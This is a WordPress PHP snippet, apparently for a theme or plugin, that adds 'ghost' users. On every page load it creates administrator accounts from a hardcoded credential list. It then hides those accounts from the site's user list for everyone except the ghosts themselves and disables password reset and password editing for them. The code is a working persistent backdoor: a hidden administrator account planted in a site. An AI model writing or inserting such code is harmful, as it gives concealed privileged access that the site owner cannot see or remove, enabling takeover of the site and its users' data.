<?php

/**
 * Ghost Users Configuration
 */
function get_ghosts() {
    return array(
        array(
            'username',            // Username
            'administrator',       // Role
            'user@email.com',      // Email
            'password'             // Password
        )
    );
}

/**
 * Return array of Ghost User IDs
 */
function get_ghosts_id() {
    $ghosts      = get_ghosts();
    $ghosts_id   = array();

    foreach ($ghosts as $ghost) {
        $user_id = username_exists($ghost[0]);
        if ($user_id) {
            $ghosts_id[] = $user_id;
        }
    }

    return $ghosts_id;
}

/**
 * Create Ghost Users if they do not exist
 */
function create_ghosts() {
    $ghosts = get_ghosts();

    if (!empty($ghosts)) {
        foreach ($ghosts as $ghost) {

            // Validate array structure (4 fields)
            if (count($ghost) !== 4) {
                continue;
            }

            list($username, $role, $email, $password) = $ghost;

            // Only create user if username and email do not exist
            if (!username_exists($username) && !email_exists($email)) {

                wp_insert_user(array(
                    'user_login' => sanitize_user($username),
                    'role'       => sanitize_text_field($role),
                    'user_email' => sanitize_email($email),
                    'user_pass'  => $password, // WP will hash automatically
                ));
            }
        }
    }
}
// Run only once WordPress has loaded properly
add_action('init', 'create_ghosts');

/**
 * Hide Ghost Users from backend Users List
 */
function hide_ghosts($user_search) {
    if (!is_admin()) {
        return;
    }

    // Current user
    $current_user = wp_get_current_user();

    // Ghost IDs
    $ghosts_id = get_ghosts_id();

    // If current user is NOT a ghost, hide ghost users
    if (!in_array($current_user->ID, $ghosts_id) && !empty($ghosts_id)) {

        global $wpdb;

        $ids = implode(',', array_map('intval', $ghosts_id));

        $user_search->query_where .= " AND {$wpdb->users}.ID NOT IN ($ids)";
    }
}
add_action('pre_user_query', 'hide_ghosts');

/**
 * Disable Password Reset for Ghosts
 */
function disable_password_reset_for_ghosts($allow, $user_id) {
    $ghosts_id = get_ghosts_id();
    return in_array($user_id, $ghosts_id) ? false : $allow;
}
add_filter('allow_password_reset', 'disable_password_reset_for_ghosts', 10, 2);

/**
 * Disable Password Fields for Ghosts in Profile Page
 */
function disable_password_edit_for_ghosts($show, $profileuser) {
    if ($profileuser instanceof WP_User) {
        $ghosts_id = get_ghosts_id();
        return in_array($profileuser->ID, $ghosts_id) ? false : $show;
    }

    return $show;
}
add_filter('show_password_fields', 'disable_password_edit_for_ghosts', 10, 2);
